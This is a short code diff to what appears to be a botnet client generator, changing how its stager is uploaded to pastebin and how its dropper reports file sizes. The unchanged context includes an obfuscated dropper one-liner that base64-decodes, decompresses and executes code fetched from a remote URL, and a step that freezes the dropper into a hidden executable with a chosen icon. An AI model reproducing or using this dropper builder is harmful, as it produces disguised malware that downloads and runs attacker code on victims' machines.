@@ -371,7 +371,7 @@ def _stager(options, **kwargs):
 
     if options.pastebin:
         assert options.pastebin, "missing argument 'pastebin' required for option 'pastebin'"
-        url = util.pastebin(stager, api_dev_key=options.pastebin)
+        url = util.pastebin(stager, options.pastebin)
     else:
         dirs = ['modules/stagers','byob/modules/stagers','byob/byob/modules/stagers']
         dirname = '.'
@@ -407,15 +407,12 @@ def _dropper(options, **kwargs):
     dropper = "import zlib,base64,marshal,urllib;exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps("urllib.urlopen({}).read()".format(repr(kwargs['url'])))))))
     with open(name, 'w') as fp:
         fp.write(dropper)
+    util.display('({:,} bytes written to {})'.format(len(dropper), name), style='dim', color='reset')
 
     if options.freeze:
-        util.display('\tCompiling executable... \n', color='reset', style='normal', end=',')
-        __load__ = threading.Event()
-        __spin__ = _spinner(__load__)
+        util.display('\tCompiling executable...\n', color='reset', style='normal', end=',')
         name = generators.freeze(name, icon=options.icon, hidden=kwargs['hidden'])
-        __load__.set()
-
-    util.display('(saved to file: {})\n'.format(name), style='dim', color='reset')
+        util.display('({:,} bytes saved to file: {})\n'.format(len(open(name, 'rb').read()), name))
     return name
 
 @util.threaded
